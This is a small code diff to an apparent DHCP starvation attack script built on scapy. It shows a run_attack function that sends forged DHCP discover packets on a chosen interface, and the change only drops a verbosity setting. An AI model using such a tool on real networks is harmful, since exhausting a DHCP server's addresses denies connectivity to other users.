@@ -7,7 +7,7 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.dhcp import BOOTP, DHCP
 
 
-def run(interface, verbose):
+def run(interface):
 
     if len(interface) > 0:
         inter = str(interface[0])
@@ -21,11 +21,11 @@ def run(interface, verbose):
                 bootps = BOOTP(chaddr=src_mac, ciaddr='0.0.0.0', xid=0x01020304, flags=1)
                 dhcps = DHCP(options=[("message-type", "discover"), "end"])
                 packet = ethernet / ip / udp / bootps / dhcps
-                sendp(packet, iface=inter, verbose=verbose)
+                sendp(packet, iface=inter, verbose=0)
         except KeyboardInterrupt:
             pass
 
 
 def run_attack(config):
-    run(config.interface, config.verbose)
+    run(config.interface)
 
